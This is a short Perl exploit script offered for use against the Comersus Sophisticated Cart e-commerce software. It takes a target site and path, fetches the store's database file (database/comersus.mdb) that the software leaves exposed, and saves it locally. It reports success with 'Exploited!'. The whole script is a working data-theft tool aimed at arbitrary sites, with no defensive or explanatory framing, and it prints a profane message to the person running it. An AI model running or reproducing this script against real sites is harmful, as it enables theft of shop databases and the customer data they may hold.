#!/usr/bin/perl -w
#
# Comersus Sophisticated Cart Database Disclosure Exploit 
#
# Author : indoushka
#
# Vondor : http://www.comersus.com
 
 
 
use LWP::Simple;
use LWP::UserAgent;

system('cls');
system('Comersus Sophisticated Cart Database Disclosure Exploit ');
system('color a');


if(@ARGV < 2)
{
print "[-]How To Use\n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 site.com /path/ \n";
print "[+] usage2 : perl $0 localhost / \n";
}
($TargetIP, $path, $File,) = @ARGV;

$File="database/comersus.mdb";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Fuck you wait!!! \n\n";

my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "D:/comersus.mdb");

if ($request->is_success)
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to D:/comersus.mdb\n";
exit();
}
else
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}
